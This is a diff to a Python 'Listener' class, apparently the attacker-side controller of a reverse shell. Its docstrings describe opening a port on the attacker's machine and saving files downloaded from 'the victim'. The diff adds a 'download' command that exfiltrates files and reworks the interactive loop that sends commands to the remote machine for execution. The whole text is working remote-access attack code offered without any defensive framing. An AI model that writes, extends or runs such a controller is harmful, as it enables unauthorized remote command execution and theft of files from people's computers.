@@ -4,6 +4,12 @@ import sys
 import json
 
 class Listener:
+    '''
+    Creates a Listener which opens a port on the
+    attackers machine through TCP socket.
+    params: ip(str), port(int)
+    '''
+    
     def __init__(self, ip:str, port:int) -> None:    
         self.ip = ip 
         self.port = port
@@ -49,24 +55,50 @@ class Listener:
         execute command on the remote machine.
         '''
         self.serial_send(command)
-        
-        command = command.split(' ')
-        if command[0] == 'exit':
-            self.connection.close()
-            sys.exit()
 
         return self.serial_receive()
+
+
+    def write_file(self, path, content):
+        '''
+        write downloaded contents from the victim 
+        to the specified path file.
+        '''
+        with open(path, 'wb') as file:
+            bytes_content = content.encode('utf-8')
+            file.write(bytes_content)
+            return (f'[*] File {path} Downloaded successfully.')
 
 
     def run(self):
         while True:
             try:
                 command = input('>> ')
-                execution_result = self.execute_remotely(command)
+
+                # create list and get commands with args
+                command_lst = command.split(' ')
+                command_list_len = len(command_lst)==2
+                cmd = command_lst[0]
+                if command_list_len:
+                    path = command_lst[1]
+                
+                if cmd == 'exit':
+                    self.connection.close()
+                    sys.exit()
+
+                elif cmd == 'download':
+                    contents = self.execute_remotely(command)
+                    execution_result = self.write_file(path, contents)
+                else :
+                    execution_result = self.execute_remotely(command)
+                
                 print(execution_result)
 
             except KeyboardInterrupt:
                 print('[!] ctrl+c detected.')
-               
+
+            except IndexError:
+                print('[!] Cannot Accept empty command.')
+
             except Exception as e:
                 print('[-] Listener Exception : ', e)
